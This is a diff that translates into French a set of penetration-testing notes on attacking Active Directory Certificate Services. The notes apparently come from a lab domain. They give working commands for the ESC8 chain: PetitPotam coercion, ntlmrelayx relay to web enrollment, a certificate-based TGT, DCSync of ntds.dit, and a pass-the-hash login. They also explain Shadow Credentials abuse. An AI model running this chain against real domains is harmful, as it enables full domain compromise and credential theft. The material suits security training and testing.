@@ -1,5 +1,5 @@
 https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adcs-certificate-services/
-# Enumeration
+# Énumération
 
 **Sans credentials (réseau) :**
 ```bash
@@ -31,35 +31,35 @@ netexec ldap domain.lab -u username -p password -M adcs
 ldapsearch -H ldap://dc_IP -x -LLL -D 'CN=<user>,OU=Users,DC=domain,DC=local' -w '<password>' -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=CONFIGURATION,DC=domain,DC=local" dNSHostName
 ```
 
-# ESC8 - coerce to domain admin
+# ESC8 - coercition vers domain admin
 
 Pré-requis :
 
-* ADCS running on the domain with web enrollment enabled.
-* A working coerce method (here we use petitpotam unauthent, but an authenticated printerbug or other coerce methods will work the same)
-* There is a useful template to exploit ESC8, by default on an active directory, its name is _DomainController_
+* ADCS actif sur le domaine avec le web enrollment activé.
+* Une méthode de coerce fonctionnelle (ici on utilise petitpotam non authentifié, mais un printerbug authentifié ou une autre méthode de coerce fonctionnera pareil)
+* Il existe un template utile pour exploiter ESC8, par défaut sur un Active Directory il s'appelle _DomainController_
 
-Let’s check if the web enrollement is up and running at : http://192.168.56.23/certsrv/certfnsh.asp
+Vérifions que le web enrollment est actif à l'adresse : http://192.168.56.23/certsrv/certfnsh.asp
 
-Add a listener to relay SMB authentication to HTTP with impacket ntlmrelayx
+Ajouter un listener pour relayer l'authentification SMB vers HTTP avec impacket ntlmrelayx
 
 ```bash
 ntlmrelayx.py -t http://192.168.56.23/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
 ```
 
-Launch the coerce with petitpotam unauthenticated (this will no more work on an up to date active directory but other coerce methods authenticated will work the same). ntlmrelayx will relay the authentication to the web enrollement and get the certificate
+Lancer le coerce avec petitpotam non authentifié (cela ne fonctionnera plus sur un Active Directory à jour, mais les autres méthodes de coerce authentifiées fonctionneront pareil). ntlmrelayx va relayer l'authentification vers le web enrollment et récupérer le certificat
 
 ```bash
 python PetitPotam.py <LOCAL_IP> <SRV_IP_TO_COERCE>
 ```
 
-Ask for a TGT with the certificate we just get
+Demander un TGT avec le certificat que l'on vient d'obtenir
 
 ```bash
 python gettgtpkinit.py -cert-pfx MACHINE\$.pfx domain.com/machine$ 'machine.ccache'
 ```
 
-And now we got a TGT for meereen so we can launch a DCsync and get all the ntds.dit content.
+On a maintenant un TGT pour meereen, on peut donc lancer un DCsync et récupérer tout le contenu de ntds.dit.
 
 ```bash
 export KRB5CCNAME=/home/pentester/Tools/PKINITtools/machine.ccache
@@ -78,7 +78,7 @@ nxc smb meereen.essos.local -u 'Administrateur' -H '4dcaa3baa4c8eddca29e2793490f
 
 ![shadow_credentials](img/shadow_creds.png)
 
-The Kerberos authentication protocol works with tickets in order to grant access. An ST (Service Ticket) can be obtained by presenting a TGT (Ticket Granting Ticket). That prior TGT can only be obtained by validating a first step named "pre-authentication" (except if that requirement is explicitly removed for some accounts, making them vulnerable to [ASREProast](https://www.thehacker.recipes/ad/movement/kerberos/asreproast)). The pre-authentication can be validated symmetrically (with a DES, RC4, AES128 or AES256 key) or asymmetrically (with certificates). The asymmetrical way of pre-authenticating is called PKINIT. Active Directory user and computer objects have an attribute called `msDS-KeyCredentialLink` where raw public keys can be set. When trying to pre-authenticate with PKINIT, the KDC will check that the authenticating user has knowledge of the matching private key, and a TGT will be sent if there is a match.  There are multiple scenarios where an attacker can have control over an account that has the ability to edit the `msDS-KeyCredentialLink` (a.k.a. "kcl") attribute of other objects (e.g. member of a [special group](https://www.thehacker.recipes/ad/movement/builtins/security-groups), has [powerful ACEs](https://www.thehacker.recipes/ad/movement/dacl/), etc.). This allows attackers to create a key pair, append to raw public key in the attribute, and obtain persistent and stealthy access to the target object (can be a user or a computer).
+Le protocole d'authentification Kerberos fonctionne avec des tickets pour accorder l'accès. Un ST (Service Ticket) peut être obtenu en présentant un TGT (Ticket Granting Ticket). Ce TGT préalable ne peut être obtenu qu'en validant une première étape appelée « pré-authentification » (sauf si cette exigence est explicitement supprimée pour certains comptes, ce qui les rend vulnérables à l'[ASREProast](https://www.thehacker.recipes/ad/movement/kerberos/asreproast)). La pré-authentification peut être validée symétriquement (avec une clé DES, RC4, AES128 ou AES256) ou asymétriquement (avec des certificats). La méthode asymétrique de pré-authentification s'appelle PKINIT. Les objets utilisateur et ordinateur d'Active Directory possèdent un attribut nommé `msDS-KeyCredentialLink` où des clés publiques brutes peuvent être définies. Lors d'une tentative de pré-authentification via PKINIT, le KDC vérifie que l'utilisateur authentifiant possède la clé privée correspondante, et un TGT est envoyé en cas de correspondance. Il existe plusieurs scénarios où un attaquant peut contrôler un compte ayant la capacité de modifier l'attribut `msDS-KeyCredentialLink` (alias « kcl ») d'autres objets (ex. membre d'un [groupe spécial](https://www.thehacker.recipes/ad/movement/builtins/security-groups), possède des [ACE puissantes](https://www.thehacker.recipes/ad/movement/dacl/), etc.). Cela permet à un attaquant de créer une paire de clés, d'ajouter la clé publique brute dans l'attribut, et d'obtenir un accès persistant et furtif à l'objet cible (utilisateur ou ordinateur).
 
 ## Coerce method
 
